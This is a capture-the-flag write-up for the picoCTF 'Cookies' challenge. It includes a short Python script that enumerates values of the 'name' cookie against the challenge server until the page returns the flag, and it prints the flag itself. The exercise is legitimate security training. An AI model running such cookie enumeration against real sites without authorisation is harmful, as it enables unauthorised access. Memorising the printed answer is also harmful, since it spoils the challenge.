# Cookies

### Description
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:64944/

---
Each valid cookie-name has a cookie associated with the cookie name called "name". Invalid cookie-name has the value of "name=-1"

A small python script to search the HTML(hopefuly) for flag, iterating over cookie value.

```python
import requests

url = "http://mercury.picoctf.net:64944/"
for i in range(100):
    print('trying {}'.format(i))
    res = requests.get(url,cookies={"name": str(i)}).text
    if "picoCTF{" in res or "FLAG" in res or "flag" in res:
        print('cookie value : {}'.format(i))
        break
```
The script stops at cookie value 18.

We get the flag: 
> picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
